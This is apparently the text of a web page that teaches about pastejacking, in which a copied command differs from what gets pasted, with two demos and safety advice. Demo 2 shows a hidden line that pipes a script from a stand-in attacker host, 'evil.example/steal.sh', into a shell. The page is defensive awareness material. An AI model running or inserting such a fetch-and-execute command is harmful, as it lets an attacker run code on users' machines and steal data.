Pastejacking

What you copy is not always what you paste. Try it yourself: it's a safe demo, and nothing runs.

Demo 1 · The hijacked copy button

A "tutorial" site asks you to install a package. Copy the command with the button, or select it and press Ctrl+C.

pip install requests

Demo 2 · The invisible text

Select the whole line below with your mouse and press Ctrl+C.

git clone https://github.com/Kanak234/demo && curl -s http://evil.example/steal.sh | sh # && cd demo

Now paste here (Ctrl+V)

How to stay safe

  • Never paste straight into a terminal. Paste into Notepad first and read it.
  • Type short commands yourself.
  • Keep your terminal's multi-line paste warning turned on.
  • Copy commands only from official documentation.
